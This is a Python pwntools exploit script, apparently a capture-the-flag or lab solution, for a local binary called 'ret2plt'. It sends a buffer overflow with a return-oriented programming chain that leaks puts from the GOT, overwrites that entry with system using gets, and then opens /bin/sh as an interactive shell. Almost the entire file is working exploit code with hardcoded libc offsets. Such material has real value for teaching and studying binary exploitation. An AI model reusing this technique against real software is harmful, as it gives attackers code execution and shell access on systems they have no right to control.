#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

p = process("./ret2plt")
context.arch = "amd64"

p.recvuntil(":")

# padding 40
padding = cyclic(40)

puts = 0x00000000004004e0
puts_got = 0x0000000000601018
pop_rdi = 0x00000000004006f3

gets = 0x0000000000400510

ropchain = flat([pop_rdi, puts_got, puts]) # 為了得到 puts 真正位置
ropchain += flat([pop_rdi, puts_got, gets]) # 為了將 system 蓋掉 puts 真正位置, 用 gets 從輸入蓋掉
ropchain += flat([pop_rdi, puts_got+8, puts]) # 此時的 puts 應要是被 Hijacking 的狀態, 取的參數是 puts_got 的下一個

# 送出 ROPChain
p.sendline(padding + ropchain)

p.recvuntil("boom !\n")


# get real puts address
real_puts = u64(p.recvuntil("\n")[:-1].ljust(8,"\x00"))
# 拿到真正的 libc, system addr
libc_base = real_puts - 0x6f690
system = libc_base + 0x45390

payload = flat([system,  "/bin/sh\x00"])

p.sendline(payload)

p.interactive()
